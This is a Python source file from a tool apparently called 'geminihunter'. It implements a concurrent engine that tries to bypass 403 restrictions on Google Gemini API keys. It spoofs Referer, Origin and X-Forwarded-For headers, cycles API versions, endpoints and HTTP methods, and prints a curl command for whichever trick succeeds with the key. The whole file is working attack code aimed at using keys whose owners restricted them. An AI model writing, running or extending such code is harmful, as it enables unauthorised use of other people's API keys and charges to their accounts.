"""403 Bypass engine with auto-registered strategy pattern."""

import asyncio
import json
import logging
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import ClassVar

import httpx

from geminihunter.models import BypassDetail

logger = logging.getLogger("geminihunter")

GEMINI_BASE_URL = "https://generativelanguage.googleapis.com"

# --- Bypass data structures ---


@dataclass
class BypassAttempt:
    """A single bypass attempt configuration."""

    technique_name: str
    headers: dict[str, str] = field(default_factory=dict)
    api_version: str = "v1beta"
    endpoint: str = "models"
    method: str = "GET"
    body: str | None = None

    def to_url(self, key: str) -> str:
        return f"{GEMINI_BASE_URL}/{self.api_version}/{self.endpoint}?key={key}"

    def to_curl(self, key: str) -> str:
        """Generate a curl command that reproduces this attempt."""
        url = self.to_url(key)
        parts = [f"curl -s -X {self.method}"]
        for k, v in self.headers.items():
            parts.append(f'-H "{k}: {v}"')
        if self.body:
            parts.append(f"-d '{self.body}'")
        parts.append(f'"{url}"')
        return " ".join(parts)

    def to_bypass_detail(self) -> BypassDetail:
        return BypassDetail(
            technique=self.technique_name,
            headers=dict(self.headers),
            api_version=self.api_version,
            endpoint=self.endpoint,
            method=self.method,
            curl_command="",  # Filled later with key
        )


# --- Strategy registry ---

_bypass_registry: list[type["BypassStrategy"]] = []


def bypass_strategy(cls: type["BypassStrategy"]) -> type["BypassStrategy"]:
    """Decorator to auto-register a bypass strategy."""
    _bypass_registry.append(cls)
    return cls


class BypassStrategy(ABC):
    """Base class for bypass techniques."""

    name: ClassVar[str]

    @abstractmethod
    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        ...


# --- Registered strategies ---


@bypass_strategy
class RefererGoogle(BypassStrategy):
    """Bypass with Google referrer headers."""

    name = "referer_google"

    REFERERS = [
        "https://www.google.com",
        "https://www.google.com/",
        "https://console.cloud.google.com",
        "https://aistudio.google.com",
        "https://makersuite.google.com",
        "https://ai.google.dev",
        "https://cloud.google.com",
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ref}",
                headers={"Referer": ref},
            )
            for ref in self.REFERERS
        ]


@bypass_strategy
class RefererTarget(BypassStrategy):
    """Bypass with target domain as referrer."""

    name = "referer_target"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        if not target_domain or target_domain == "direct":
            return []
        variants = [
            f"https://{target_domain}",
            f"https://{target_domain}/",
            f"https://www.{target_domain}",
            f"http://{target_domain}",
        ]
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ref}",
                headers={"Referer": ref},
            )
            for ref in variants
        ]


@bypass_strategy
class RefererCommon(BypassStrategy):
    """Bypass with common referrer values."""

    name = "referer_common"

    REFERERS = [
        "https://googleapis.com",
        "http://localhost",
        "http://localhost:3000",
        "http://localhost:8080",
        "http://127.0.0.1",
        "https://example.com",
        "",  # Empty referer
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ref or 'empty'}",
                headers={"Referer": ref} if ref else {},
            )
            for ref in self.REFERERS
        ]


@bypass_strategy
class OriginHeader(BypassStrategy):
    """Bypass using Origin header manipulation."""

    name = "origin_header"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        origins = [
            "https://www.google.com",
            "https://console.cloud.google.com",
            "https://aistudio.google.com",
            "null",  # Some servers allow null origin
        ]
        if target_domain and target_domain != "direct":
            origins.append(f"https://{target_domain}")

        return [
            BypassAttempt(
                technique_name=f"{self.name}:{origin}",
                headers={"Origin": origin},
            )
            for origin in origins
        ]


@bypass_strategy
class ForwardedForBypass(BypassStrategy):
    """Bypass using X-Forwarded-For / X-Real-IP with internal IPs."""

    name = "xff_bypass"

    INTERNAL_IPS = [
        "127.0.0.1",
        "10.0.0.1",
        "172.16.0.1",
        "192.168.1.1",
        "0.0.0.0",
        "::1",
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ip}",
                headers={
                    "X-Forwarded-For": ip,
                    "X-Real-IP": ip,
                },
            )
            for ip in self.INTERNAL_IPS
        ]


@bypass_strategy
class APIVersionBrute(BypassStrategy):
    """Bypass by trying different API versions."""

    name = "api_version"

    VERSIONS = ["v1", "v1beta", "v1beta2", "v1beta3"]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ver}",
                api_version=ver,
            )
            for ver in self.VERSIONS
        ]


@bypass_strategy
class EndpointSwitch(BypassStrategy):
    """Bypass by trying different API endpoints."""

    name = "endpoint_switch"

    ENDPOINTS = [
        ("models", "GET", None),
        (
            "models/gemini-2.0-flash:generateContent",
            "POST",
            json.dumps({"contents": [{"parts": [{"text": "hi"}]}]}),
        ),
        (
            "models/embedding-001:embedContent",
            "POST",
            json.dumps(
                {
                    "model": "models/embedding-001",
                    "content": {"parts": [{"text": "test"}]},
                }
            ),
        ),
        (
            "models/gemini-2.0-flash:countTokens",
            "POST",
            json.dumps({"contents": [{"parts": [{"text": "test"}]}]}),
        ),
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        attempts = []
        for endpoint, method, body in self.ENDPOINTS:
            headers = {}
            if body:
                headers["Content-Type"] = "application/json"
            attempts.append(
                BypassAttempt(
                    technique_name=f"{self.name}:{endpoint}",
                    endpoint=endpoint,
                    method=method,
                    body=body,
                    headers=headers,
                )
            )
        return attempts


@bypass_strategy
class MethodSwitch(BypassStrategy):
    """Bypass by switching HTTP method."""

    name = "method_switch"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(technique_name=f"{self.name}:POST", method="POST"),
            BypassAttempt(technique_name=f"{self.name}:OPTIONS", method="OPTIONS"),
            BypassAttempt(technique_name=f"{self.name}:HEAD", method="HEAD"),
        ]


@bypass_strategy
class ComboRefererVersion(BypassStrategy):
    """Combo: Google referer + different API versions."""

    name = "combo_referer_version"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        attempts = []
        referers = [
            "https://www.google.com",
            "https://aistudio.google.com",
        ]
        versions = ["v1", "v1beta", "v1beta2", "v1beta3"]

        for ref in referers:
            for ver in versions:
                attempts.append(
                    BypassAttempt(
                        technique_name=f"{self.name}:{ref}+{ver}",
                        headers={"Referer": ref},
                        api_version=ver,
                    )
                )
        return attempts


@bypass_strategy
class ComboRefererEndpoint(BypassStrategy):
    """Combo: Google referer + generateContent endpoint."""

    name = "combo_referer_endpoint"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        body = json.dumps({"contents": [{"parts": [{"text": "hi"}]}]})
        referers = [
            "https://www.google.com",
            "https://aistudio.google.com",
            "https://console.cloud.google.com",
        ]
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ref}+generateContent",
                headers={
                    "Referer": ref,
                    "Content-Type": "application/json",
                },
                endpoint="models/gemini-2.0-flash:generateContent",
                method="POST",
                body=body,
            )
            for ref in referers
        ]


# --- Bypass engine ---


BYPASS_TIMEOUT = 5.0  # Shorter timeout for bypass attempts


class BypassEngine:
    """Runs all registered strategies against a 403'd key."""

    def __init__(self, strategies: list[BypassStrategy] | None = None):
        if strategies is None:
            self.strategies = [cls() for cls in _bypass_registry]
        else:
            self.strategies = strategies

    def generate_all_attempts(
        self, key: str, target_domain: str
    ) -> list[BypassAttempt]:
        attempts: list[BypassAttempt] = []
        for strategy in self.strategies:
            attempts.extend(strategy.generate_attempts(key, target_domain))
        return attempts

    async def run(
        self,
        key: str,
        target_domain: str,
        client: httpx.AsyncClient,
        concurrency: int = 10,
    ) -> BypassDetail | None:
        """
        Execute all bypass attempts concurrently.
        Returns immediately on first success, cancelling remaining tasks.
        """
        attempts = self.generate_all_attempts(key, target_domain)
        sem = asyncio.Semaphore(concurrency)
        found: asyncio.Event = asyncio.Event()
        winner: list[BypassAttempt] = []  # mutable container for result

        async def try_attempt(attempt: BypassAttempt) -> None:
            if found.is_set():
                return
            async with sem:
                if found.is_set():
                    return
                try:
                    url = attempt.to_url(key)
                    kwargs: dict = {"headers": dict(attempt.headers)}
                    if attempt.body:
                        kwargs["content"] = attempt.body

                    resp = await client.request(
                        attempt.method, url, timeout=BYPASS_TIMEOUT, **kwargs
                    )

                    # 200 = direct success, 429 = key accepted but rate-limited
                    # Both confirm the bypass works (original was 403)
                    if resp.status_code in (200, 429):
                        winner.append(attempt)
                        found.set()

                except (httpx.HTTPError, Exception):
                    pass

        # Fire all attempts, cancel on first hit
        tasks = [asyncio.create_task(try_attempt(a)) for a in attempts]
        try:
            # Wait for all to finish or until we find a winner
            done, pending = await asyncio.wait(
                tasks,
                timeout=BYPASS_TIMEOUT + 2,
                return_when=asyncio.FIRST_EXCEPTION,
            )
            # Check periodically if we got a winner
            if not found.is_set():
                await asyncio.wait(tasks, timeout=0.1)
        finally:
            # Cancel any still running
            for t in tasks:
                if not t.done():
                    t.cancel()
            # Suppress cancellation errors
            await asyncio.gather(*tasks, return_exceptions=True)

        if winner:
            detail = winner[0].to_bypass_detail()
            detail.curl_command = winner[0].to_curl(key)
            return detail

        return None
